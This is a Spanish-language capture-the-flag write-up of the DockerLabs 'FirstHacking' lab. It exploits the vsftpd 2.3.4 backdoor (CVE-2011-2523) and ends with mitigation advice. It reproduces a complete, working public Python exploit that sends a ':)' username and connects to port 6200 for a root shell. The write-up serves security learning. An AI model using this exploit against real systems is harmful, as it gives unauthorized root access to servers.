# FirstHacking — vsftpd 2.3.4 Backdoor

**Dificultad:** Muy fácil
**Plataforma:** DockerLabs

## Reconocimiento

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

Resultado: puerto 21/tcp abierto, `vsftpd 2.3.4`.

<img width="606" height="226" alt="Captura de pantalla 2026-10-03 230446" src="https://github.com/user-attachments/assets/6a7a5a1e-b9fb-4c40-991b-f2c1b2b8ab9f" />


## Análisis de vulnerabilidad

La versión `vsftpd 2.3.4` tiene un backdoor conocido (CVE-2011-2523): cualquier usuario que incluya `:)` en el campo de login dispara un listener en el puerto 6200 que da una shell como root.

## Explotación

Exploit público (Exploit-DB #49757), usando `telnetlib`:

<img width="1269" height="1177" alt="Captura de pantalla 2026-10-03 233319" src="https://github.com/user-attachments/assets/7a5ea87c-7e8a-44a4-a6a4-0439df0213fd" />


```python
#!/usr/bin/python3
from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    print('  [+]Exiting...')
    exit(0)

signal(SIGINT, handler)
parser = argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host")
args = parser.parse_args()
host = args.host

portFTP = 21
user = "USER nergal:)"
password = "PASS pass"

tn = Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.")
tn.write(password.encode('ascii') + b"\n")

tn2 = Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
```

Ejecución:

```bash
python3 exploit.py 172.17.0.2
```
<img width="617" height="546" alt="Captura de pantalla 2026-10-03 233243" src="https://github.com/user-attachments/assets/bb8a5056-81f5-4d92-a26b-8e3b2e6836f1" />



Resultado: shell interactiva directa como **root** (confirmado con `whoami`).

<img width="422" height="111" alt="Captura de pantalla 2026-10-03 233211" src="https://github.com/user-attachments/assets/20047a53-d6c6-4694-91be-de297c01c5dc" />


## Causa raíz

El backdoor fue insertado maliciosamente en el código fuente de vsftpd 2.3.4 entre el 30/06 y el 01/07/2011, tras comprometer los servidores de distribución. Cualquier login con `:)` abre una shell en el puerto 6200.

## Mitigación

- Actualizar a una versión parcheada.
- Verificar checksums/firmas de los binarios descargados.
